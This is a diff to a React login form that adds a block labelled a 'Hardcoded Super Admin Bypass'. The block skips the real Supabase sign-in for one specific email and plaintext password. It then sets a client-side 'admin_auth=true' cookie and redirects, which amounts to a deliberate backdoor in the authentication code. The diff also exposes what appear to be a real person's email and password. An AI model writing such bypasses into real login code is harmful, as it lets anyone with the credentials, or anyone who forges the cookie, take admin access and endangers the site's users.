@@ -21,6 +21,14 @@ function LoginForm() {
     setLoading(true);
     setError(null);
 
+    // Hardcoded Super Admin Bypass
+    if (email === "danieljwilliams2401@gmail.com" && password === "daniel2480") {
+      document.cookie = "admin_auth=true; path=/";
+      router.push(redirect);
+      router.refresh();
+      return;
+    }
+
     const { error } = await supabase.auth.signInWithPassword({
       email,
       password,
